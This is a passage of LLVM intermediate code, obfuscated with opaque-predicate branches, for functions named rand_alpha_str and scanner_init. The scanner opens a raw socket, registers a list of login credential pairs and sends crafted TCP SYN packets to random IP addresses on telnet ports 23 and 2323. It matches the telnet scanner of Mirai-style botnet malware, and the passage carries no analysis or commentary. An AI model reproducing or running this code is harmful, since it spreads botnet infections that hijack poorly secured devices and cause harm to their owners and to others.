  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %21
  %97 = load i32, i32* %12, align 4
  %98 = icmp sgt i32 %97, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %99 = call i32 @rand_next()
  %_ = sub i32 %99, 255
  %gen = mul i32 %_, 255
  %_7 = sub i32 0, %99
  %gen8 = add i32 %_7, 255
  %_9 = sub i32 %99, 255
  %gen10 = mul i32 %_9, 255
  %100 = and i32 %99, 255
  %101 = trunc i32 %100 to i8
  %102 = load i8*, i8** %11, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %11, align 8
  store i8 %101, i8* %102, align 1
  %104 = load i32, i32* %12, align 4
  %_11 = shl i32 %104, -1
  %_12 = sub i32 0, %104
  %gen13 = add i32 %_12, -1
  %_14 = sub i32 %104, -1
  %gen15 = mul i32 %_14, -1
  %105 = add nsw i32 %104, -1
  store i32 %105, i32* %12, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = load i32, i32* @x.61
  %4 = load i32, i32* @y.62
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca [32 x i8], align 16
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %14 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %15 = call i8* @table_retrieve_val(i32 28, i32* null)
  %16 = call i8* @strcpy(i8* %14, i8* %15) #6
  %17 = load i32, i32* @x.61
  %18 = load i32, i32* @y.62
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %29, %originalBBpart2
  %26 = load i32, i32* %12, align 4
  %27 = add nsw i32 %26, -1
  store i32 %27, i32* %12, align 4
  %28 = icmp ne i32 %26, 0
  br i1 %28, label %29, label %39

; <label>:29:                                     ; preds = %25
  %30 = call i32 @rand_next()
  %31 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %32 = call i32 @util_strlen(i8* %31)
  %33 = urem i32 %30, %32
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = load i8*, i8** %11, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %11, align 8
  store i8 %36, i8* %37, align 1
  br label %25

; <label>:39:                                     ; preds = %25
  %40 = load i32, i32* @x.61
  %41 = load i32, i32* @y.62
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  call void @table_lock_val(i8 zeroext 28)
  %48 = load i32, i32* @x.61
  %49 = load i32, i32* @y.62
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %56 = alloca i8*, align 8
  %57 = alloca i32, align 4
  %58 = alloca [32 x i8], align 16
  store i8* %0, i8** %56, align 8
  store i32 %1, i32* %57, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %59 = getelementptr inbounds [32 x i8], [32 x i8]* %58, i32 0, i32 0
  %60 = call i8* @table_retrieve_val(i32 28, i32* null)
  %61 = call i8* @strcpy(i8* %59, i8* %60) #6
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  call void @table_lock_val(i8 zeroext 28)
  br label %originalBB1
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = load i32, i32* @x.63
  %2 = load i32, i32* @y.64
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i16, align 2
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.tcphdr*, align 8
  %13 = alloca %struct.fd_set.28, align 8
  %14 = alloca %struct.fd_set.28, align 8
  %15 = alloca %struct.scanner_connection*, align 8
  %16 = alloca %struct.timeval.29, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca %struct.sockaddr_in, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.tcphdr*, align 8
  %25 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %26 = alloca i32, align 4
  %27 = alloca [1514 x i8], align 16
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.tcphdr*, align 8
  %30 = alloca %struct.scanner_connection*, align 8
  %31 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i8*, align 8
  %49 = alloca i32, align 4
  %50 = alloca i8*, align 8
  %51 = alloca i32, align 4
  %52 = alloca i8*, align 8
  %53 = alloca i32, align 4
  %54 = call i32 @fork() #6
  store i32 %54, i32* @scanner_pid, align 4
  %55 = load i32, i32* @scanner_pid, align 4
  %56 = icmp sgt i32 %55, 0
  %57 = load i32, i32* @x.63
  %58 = load i32, i32* @y.64
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %68, label %65

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* @scanner_pid, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %65, %originalBBpart2
  ret void

; <label>:69:                                     ; preds = %65
  %70 = call i32 @util_local_addr()
  store i32 %70, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %71 = call i64 @time(i64* null) #6
  %72 = trunc i64 %71 to i32
  store i32 %72, i32* @fake_time, align 4
  %73 = call noalias i8* @calloc(i64 256, i64 296) #6
  %74 = bitcast i8* %73 to %struct.scanner_connection*
  store %struct.scanner_connection* %74, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %9, align 4
  br label %75

; <label>:75:                                     ; preds = %105, %69
  %76 = load i32, i32* %9, align 4
  %77 = icmp slt i32 %76, 256
  br i1 %77, label %78, label %108

; <label>:78:                                     ; preds = %75
  %79 = load i32, i32* @x.63
  %80 = load i32, i32* @y.64
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  %87 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i64 %89
  %91 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %90, i32 0, i32 3
  store i32 0, i32* %91, align 8
  %92 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %92, i64 %94
  %96 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %95, i32 0, i32 1
  store i32 -1, i32* %96, align 8
  %97 = load i32, i32* @x.63
  %98 = load i32, i32* @y.64
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %105

; <label>:105:                                    ; preds = %originalBBpart24
  %106 = load i32, i32* %9, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %9, align 4
  br label %75

; <label>:108:                                    ; preds = %75
  %109 = load i32, i32* @x.63
  %110 = load i32, i32* @y.64
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %108
  %117 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %117, i32* @rsck, align 4
  %118 = icmp eq i32 %117, -1
  %119 = load i32, i32* @x.63
  %120 = load i32, i32* @y.64
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %118, label %127, label %128

; <label>:127:                                    ; preds = %originalBBpart28
  call void @exit(i32 0) #8
  unreachable

; <label>:128:                                    ; preds = %originalBBpart28
  %129 = load i32, i32* @x.63
  %130 = load i32, i32* @y.64
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %128
  %137 = load i32, i32* @rsck, align 4
  %138 = load i32, i32* @rsck, align 4
  %139 = call i32 (i32, i32, ...) @fcntl(i32 %138, i32 3, i32 0)
  %140 = or i32 2048, %139
  %141 = call i32 (i32, i32, ...) @fcntl(i32 %137, i32 4, i32 %140)
  store i32 1, i32* %9, align 4
  %142 = load i32, i32* @rsck, align 4
  %143 = bitcast i32* %9 to i8*
  %144 = call i32 @setsockopt(i32 %142, i32 0, i32 3, i8* %143, i32 4) #6
  %145 = icmp ne i32 %144, 0
  %146 = load i32, i32* @x.63
  %147 = load i32, i32* @y.64
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart220, label %originalBB10alteredBB

originalBBpart220:                                ; preds = %originalBB10
  br i1 %145, label %154, label %157

; <label>:154:                                    ; preds = %originalBBpart220
  %155 = load i32, i32* @rsck, align 4
  %156 = call i32 @close(i32 %155)
  call void @exit(i32 0) #8
  unreachable

; <label>:157:                                    ; preds = %originalBBpart220
  br label %158

; <label>:158:                                    ; preds = %originalBBpart224, %157
  %159 = call i32 @rand_next()
  %160 = and i32 %159, 65535
  %161 = trunc i32 %160 to i16
  store i16 %161, i16* %10, align 2
  br label %162

; <label>:162:                                    ; preds = %158
  %163 = load i32, i32* @x.63
  %164 = load i32, i32* @y.64
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %162
  %171 = load i16, i16* %10, align 2
  %172 = call zeroext i16 @ntohs(i16 zeroext %171) #7
  %173 = zext i16 %172 to i32
  %174 = icmp slt i32 %173, 1024
  %175 = load i32, i32* @x.63
  %176 = load i32, i32* @y.64
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %174, label %158, label %183

; <label>:183:                                    ; preds = %originalBBpart224
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %11, align 8
  %184 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i64 1
  %186 = bitcast %struct.iphdr* %185 to %struct.tcphdr*
  store %struct.tcphdr* %186, %struct.tcphdr** %12, align 8
  %187 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %188 = bitcast %struct.iphdr* %187 to i8*
  %189 = load i8, i8* %188, align 4
  %190 = and i8 %189, -16
  %191 = or i8 %190, 5
  store i8 %191, i8* %188, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %193 = bitcast %struct.iphdr* %192 to i8*
  %194 = load i8, i8* %193, align 4
  %195 = and i8 %194, 15
  %196 = or i8 %195, 64
  store i8 %196, i8* %193, align 4
  %197 = call zeroext i16 @htons(i16 zeroext 40) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 2
  store i16 %197, i16* %199, align 2
  %200 = call i32 @rand_next()
  %201 = trunc i32 %200 to i16
  %202 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 3
  store i16 %201, i16* %203, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 5
  store i8 64, i8* %205, align 4
  %206 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 6
  store i8 6, i8* %207, align 1
  %208 = call zeroext i16 @htons(i16 zeroext 23) #7
  %209 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 1
  store i16 %208, i16* %210, align 2
  %211 = load i16, i16* %10, align 2
  %212 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 0
  store i16 %211, i16* %213, align 4
  %214 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 4
  %216 = load i16, i16* %215, align 4
  %217 = and i16 %216, -241
  %218 = or i16 %217, 80
  store i16 %218, i16* %215, align 4
  %219 = call i32 @rand_next()
  %220 = and i32 %219, 65535
  %221 = trunc i32 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 5
  store i16 %221, i16* %223, align 2
  %224 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = and i16 %226, -513
  %228 = or i16 %227, 512
  store i16 %228, i16* %225, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 15)
  br label %229

; <label>:229:                                    ; preds = %originalBBpart2366, %183
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %230 = load i32, i32* @fake_time, align 4
  %231 = load i32, i32* %18, align 4
  %232 = icmp ne i32 %230, %231
  br i1 %232, label %233, label %370

; <label>:233:                                    ; preds = %229
  %234 = load i32, i32* @x.63
  %235 = load i32, i32* @y.64
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %233
  %242 = load i32, i32* @fake_time, align 4
  store i32 %242, i32* %18, align 4
  store i32 0, i32* %9, align 4
  %243 = load i32, i32* @x.63
  %244 = load i32, i32* @y.64
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %251

; <label>:251:                                    ; preds = %366, %originalBBpart228
  %252 = load i32, i32* %9, align 4
  %253 = icmp slt i32 %252, 384
  br i1 %253, label %254, label %369

; <label>:254:                                    ; preds = %251
  %255 = load i32, i32* @x.63
  %256 = load i32, i32* @y.64
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %254
  %263 = bitcast %struct.sockaddr_in* %22 to i8*
  call void @llvm.memset.p0i8.i64(i8* %263, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %23, align 8
  %264 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i64 1
  %266 = bitcast %struct.iphdr* %265 to %struct.tcphdr*
  store %struct.tcphdr* %266, %struct.tcphdr** %24, align 8
  %267 = call i32 @rand_next()
  %268 = trunc i32 %267 to i16
  %269 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 3
  store i16 %268, i16* %270, align 4
  %271 = load i32, i32* @LOCAL_ADDR, align 4
  %272 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 8
  store i32 %271, i32* %273, align 4
  %274 = call i32 @get_random_ip()
  %275 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i32 0, i32 9
  store i32 %274, i32* %276, align 4
  %277 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 7
  store i16 0, i16* %278, align 2
  %279 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %280 = bitcast %struct.iphdr* %279 to i16*
  %281 = call zeroext i16 @checksum_generic(i16* %280, i32 20)
  %282 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 7
  store i16 %281, i16* %283, align 2
  %284 = load i32, i32* %9, align 4
  %285 = srem i32 %284, 10
  %286 = icmp eq i32 %285, 0
  %287 = load i32, i32* @x.63
  %288 = load i32, i32* @y.64
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBBpart238, label %originalBB30alteredBB

originalBBpart238:                                ; preds = %originalBB30
  br i1 %286, label %295, label %315

; <label>:295:                                    ; preds = %originalBBpart238
  %296 = load i32, i32* @x.63
  %297 = load i32, i32* @y.64
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %295
  %304 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %305 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %306 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %305, i32 0, i32 1
  store i16 %304, i16* %306, align 2
  %307 = load i32, i32* @x.63
  %308 = load i32, i32* @y.64
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %335

; <label>:315:                                    ; preds = %originalBBpart238
  %316 = load i32, i32* @x.63
  %317 = load i32, i32* @y.64
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %315
  %324 = call zeroext i16 @htons(i16 zeroext 23) #7
  %325 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 1
  store i16 %324, i16* %326, align 2
  %327 = load i32, i32* @x.63
  %328 = load i32, i32* @y.64
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %335

; <label>:335:                                    ; preds = %originalBBpart246, %originalBBpart242
  %336 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 9
  %338 = load i32, i32* %337, align 4
  %339 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %340 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %339, i32 0, i32 2
  store i32 %338, i32* %340, align 4
  %341 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %342 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %341, i32 0, i32 6
  store i16 0, i16* %342, align 4
  %343 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %344 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %345 = bitcast %struct.tcphdr* %344 to i8*
  %346 = call zeroext i16 @htons(i16 zeroext 20) #7
  %347 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %343, i8* %345, i16 zeroext %346, i32 20)
  %348 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i32 0, i32 6
  store i16 %347, i16* %349, align 4
  %350 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 0
  store i16 2, i16* %350, align 4
  %351 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i32 0, i32 9
  %353 = load i32, i32* %352, align 4
  %354 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 2
  %355 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %354, i32 0, i32 0
  store i32 %353, i32* %355, align 4
  %356 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %357 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %356, i32 0, i32 1
  %358 = load i16, i16* %357, align 2
  %359 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 1
  store i16 %358, i16* %359, align 2
  %360 = load i32, i32* @rsck, align 4
  %361 = bitcast %union.__CONST_SOCKADDR_ARG* %25 to %struct.sockaddr**
  %362 = bitcast %struct.sockaddr_in* %22 to %struct.sockaddr*
  store %struct.sockaddr* %362, %struct.sockaddr** %361, align 8
  %363 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %25, i32 0, i32 0
  %364 = load %struct.sockaddr*, %struct.sockaddr** %363, align 8
  %365 = call i64 @sendto(i32 %360, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %364, i32 16)
  br label %366

; <label>:366:                                    ; preds = %335
  %367 = load i32, i32* %9, align 4
  %368 = add nsw i32 %367, 1
  store i32 %368, i32* %9, align 4
  br label %251

; <label>:369:                                    ; preds = %251
  br label %370

; <label>:370:                                    ; preds = %369, %229
  store i32 0, i32* %17, align 4
  br label %371

